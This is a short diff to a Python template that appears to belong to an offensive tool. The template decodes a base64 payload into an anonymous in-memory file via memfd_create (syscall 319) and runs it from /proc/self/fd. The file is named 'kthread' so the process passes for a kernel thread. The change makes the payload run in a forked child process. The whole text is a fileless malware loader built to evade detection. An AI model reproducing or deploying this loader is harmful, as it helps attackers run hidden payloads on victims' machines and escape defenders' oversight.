@@ -38,7 +38,11 @@ import os, sys, ctypes, base64
 fd = ctypes.CDLL(None).syscall(319, "kthread", 0)
 os.write(fd, base64.b64decode(p))
 try:
-    os.execv("/proc/self/fd/%i" % fd, {arguments})
+    pid = os.fork()
+    if pid > 0:
+        print("Child process PID: %i" % pid)
+    else:
+        os.execv("/proc/self/fd/%i" % fd, {arguments})
 except Exception as e:
     print("Execution failed (%s)!" % str(e))
 """
